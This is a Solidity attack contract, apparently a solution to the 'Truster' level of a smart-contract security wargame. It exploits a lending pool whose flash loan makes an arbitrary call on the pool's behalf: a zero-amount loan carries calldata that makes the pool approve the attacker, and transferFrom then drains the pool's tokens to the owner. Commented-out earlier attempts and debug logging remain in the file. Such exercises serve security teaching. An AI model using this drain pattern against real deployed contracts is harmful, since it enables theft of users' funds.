pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";

import "hardhat/console.sol";

contract TrustAttack {

	using Address for address;

    	IERC20 public damnValuableToken;
	
	TrusterLenderPool public pool;
	
	address owner;

	constructor(){

		owner = msg.sender;
	}
	function attack(address poolAddress, address tokenAddress, uint amount) external{

		pool = TrusterLenderPool(poolAddress);

        	damnValuableToken = IERC20(tokenAddress);
		// console.logString(abi.encodeWithSignature(
		// 		"attackCallback",
		// 		_token,
		// 		amount
		// 	));
		pool.flashLoan(
			0, //No need to pay back the flashLoan if we don't borrow
			address(this),
			tokenAddress,
			// abi.encodeWithSignature(
			// 	"attackCallback(address,uint256)",
			// 	_token,
			// 	amount
			// )
			abi.encodeWithSignature(
				"approve(address,uint256)",
				address(this),
				amount
			)
		
		);
		
		damnValuableToken.transferFrom(poolAddress, owner, amount);	
		// address(this).functionCall(
		// 	abi.encodeWithSignature(
		// 		"attackCallback(address,uint256)",
		// 		_token,
		// 		amount
		// 	)
		// );
	}

	function attackCallback(address _tokenAddress, uint256 amount) external{

		console.log("inside aatackcallback");
		damnValuableToken = IERC20(_tokenAddress);

		damnValuableToken.transfer(msg.sender, amount);
		// damnValuableToken.transferFrom(address(this), msg.sender, amount);

	}
}